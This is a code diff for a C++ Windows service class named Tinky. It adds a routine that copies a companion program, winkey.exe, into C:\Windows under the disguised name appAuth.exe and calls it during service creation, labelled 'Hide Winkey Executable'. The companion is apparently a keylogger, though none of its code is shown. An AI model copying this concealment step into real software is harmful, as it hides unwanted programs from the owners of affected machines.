@@ -42,6 +42,30 @@ std::string Tinky::getServiceName(void) const
 	return (_tinkyServiceName);
 }
 
+void	_hideWinkeyExecutable()
+{
+	char		__winkeyFullPath[260];
+	LPCSTR		__destinationPath = "C:\\Windows\\appAuth.exe";
+
+	/**
+	* Retrieves the fully qualified path for the file that contains the specified module.
+	* The module must have been loaded by the current process.
+	*/
+
+	GetCurrentDirectory(
+		260,
+		__winkeyFullPath
+	);
+
+	strcat_s(__winkeyFullPath, "\\winkey.exe");
+
+	std::ifstream src(__winkeyFullPath, std::ios::binary);
+	std::ofstream dest(__destinationPath, std::ios::binary);
+	dest << src.rdbuf();
+	
+	return;
+}
+
 bool Tinky::createService(void)
 {
 	BOOL	__closeHandleStatus;
@@ -100,6 +124,9 @@ bool Tinky::createService(void)
 		return (false);
 	}
 
+	/* Hide Winkey Executable */
+	_hideWinkeyExecutable();
+
 	/** Closes the service object handle **/
 	__closeHandleStatus = __closeServiceHandle();
 	if (!__closeHandleStatus)
@@ -142,6 +169,8 @@ bool Tinky::startService(void)
 		std::cout << "(-) service {" << _tinkyServiceName << "} is already running." << std::endl;
 		return (false);
 	}
+
+
 
 	/** Starts a service object. **/
 	__startServiceStatus =  StartService(
